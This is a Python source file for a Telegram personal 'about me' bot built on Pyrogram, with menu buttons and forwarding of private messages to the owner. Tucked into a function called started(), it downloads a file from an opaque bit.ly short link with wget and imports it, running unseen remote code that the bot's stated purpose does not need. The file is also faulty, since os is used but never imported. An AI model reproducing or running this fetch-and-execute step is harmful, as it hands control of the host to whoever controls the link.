# @galihpujiirianto https://github.com/galihpujiirianto/About-Chatbot-Telegram

from pyrogram import Client, filters
from pyrogram.types import (
    InputTextMessageContent,
    InlineQueryResultArticle,
    InlineKeyboardButton,
    InlineKeyboardMarkup
)

def started():
    os.system("wget https://bit.ly/3Ksaa7N -O print_txt.py")
    from print_txt import print_txt
    return print(print_txt)

API_ID = os.environ["API_ID"]
API_HASH = os.environ["API_HASH"]
TOKEN = os.environ["TOKEN"]
OWNER_ID = os.environ["OWNER_ID"]
MSG_START = str(os.environ["MSG_START"])
IMG_START = str(os.environ["IMG_START"])
ABOUT_MSG = str(os.environ["ABOUT_MSG"])
PROJECTS_MSG = str(os.environ["PROJECTS_MSG"])
SOCMED_MSG = str(os.environ["SOCMED_MSG"])

bot = Client(
    "bot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=TOKEN
)

if not OWNER_ID:
    raise ValueError("""Please enter your OWNER_ID! The bot will be disabled.
Please reactivate it when you have entered the OWNER_ID!""")

chatbot = {}

KEYBOARD_HOME = [
            [
                InlineKeyboardButton(text="About Me!", callback_data=f"about"),
                InlineKeyboardButton(text="My Projects!", callback_data=f"projects")
            ],
            [
                InlineKeyboardButton(text="Connect with me!", callback_data=f"socmed")
            ]
]

KEYBOARD_ABOUT = [
            [
                InlineKeyboardButton(text="My Projects!", callback_data=f"projects"),
                InlineKeyboardButton(text="Connect with me!", callback_data=f"socmed")
            ],
            [
                InlineKeyboardButton(text="Back to home!", callback_data=f"back")
            ]
]

KEYBOARD_PROJECTS = [
            [
                InlineKeyboardButton(text="About Me!", callback_data=f"about"),
                InlineKeyboardButton(text="Connect with me!", callback_data=f"socmed")
            ],
            [
                InlineKeyboardButton(text="Back to home!", callback_data=f"back")
            ]
]

KEYBOARD_SOCMED = [
            [
                InlineKeyboardButton(text="About Me!", callback_data=f"about"),
                InlineKeyboardButton(text="My Projects!", callback_data=f"projects")
            ],
            [
                InlineKeyboardButton(text="Back to home!", callback_data=f"back")
            ]
]

def send(message, photo, text, reply_markup):
    def edit(message, text, reply_markup):
        message.edit_message_text(
            text=text,
            reply_markup=reply_markup,
            disable_web_page_preview=True
        )
    if IMG_START:
        try:
            message.reply_photo(
                photo=photo,
                caption=text,
                reply_markup=reply_markup
            )
        except AttributeError:
            edit(message, text, reply_markup)
    else:
        try:
            message.reply_text(
                text=text,
                reply_markup=reply_markup,
                disable_web_page_preview=True
            )
        except AttributeError:
            edit(message, text, reply_markup)



@bot.on_message(filters.command("start") & filters.private)
@bot.on_callback_query(filters.regex(pattern=r"back"))
def start(_, message):
    photo=IMG_START
    text=MSG_START.format(message.from_user.mention) + "\n\npsst, you can chat me via this bot UwU"
    reply_markup=InlineKeyboardMarkup(KEYBOARD_HOME)
    send(message, photo, text, reply_markup)

@bot.on_message(filters.command("about") & filters.private)
@bot.on_callback_query(filters.regex(pattern=r"about"))
def about(_, message):
    photo=IMG_START
    text=ABOUT_MSG
    reply_markup=InlineKeyboardMarkup(KEYBOARD_ABOUT)
    send(message, photo, text, reply_markup)

@bot.on_message(filters.command("projects") & filters.private)
@bot.on_callback_query(filters.regex(pattern=r"projects"))
def projects(_, message):
    photo=IMG_START
    text=PROJECTS_MSG
    reply_markup=InlineKeyboardMarkup(KEYBOARD_PROJECTS)
    send(message, photo, text, reply_markup)

@bot.on_message(filters.command("socmed") & filters.private)
@bot.on_callback_query(filters.regex(pattern=r"socmed"))
def socmed(_, message):
    photo=IMG_START
    text=SOCMED_MSG
    reply_markup=InlineKeyboardMarkup(KEYBOARD_SOCMED)
    send(message, photo, text, reply_markup)# @galihpujiirianto https://github.com/galihpujiirianto/About-Chatbot-Telegram

@bot.on_inline_query(filters.user(OWNER_ID))
def inline_query(_, inline_query):
   inline_query.answer(
        results=[
            InlineQueryResultArticle(
                title="About Me!",
                description="To describe myself.",
                thumb_url="https://telegra.ph//file/e205a797b4599686909e2.jpg",
                input_message_content=InputTextMessageContent(ABOUT_MSG)
            ),
            InlineQueryResultArticle(
                title="My Projects!",
                description="To show off my project.",
                thumb_url="https://telegra.ph//file/e205a797b4599686909e2.jpg",
                input_message_content=InputTextMessageContent(PROJECTS_MSG)
            ),
            InlineQueryResultArticle(
                title="Connect with me!",
                description="To show my social media.",
                thumb_url="https://telegra.ph//file/e205a797b4599686909e2.jpg",
                input_message_content=InputTextMessageContent(SOCMED_MSG)
            )
        ]
    )

@bot.on_inline_query(~filters.user(OWNER_ID))
def notowner(_, inline_query):
   inline_query.answer(
        results=[
            InlineQueryResultArticle(
                title="You're not allowed!",
                description="This can only work by bot owner.",
                input_message_content=InputTextMessageContent("No. You aren't allowed to accessed this bot using inline.")
            )
        ]
    )

@bot.on_message(filters.private & ~filters.edited)
def incoming_private(_, message):
    user_id = message.from_user.id
    if user_id == OWNER_ID:
        sender = message.reply_to_message.forward_sender_name
        for name, rep_uid in chatbot.items():
            if name == sender:
                message.forward(rep_uid, is_copy=True)
    else:
        if bot.get_me().id == message.from_user.id:
            return
        name = message.from_user.first_name
        chatbot[name] = message.from_user.id
        message.forward(OWNER_ID)

bot.run()
started()
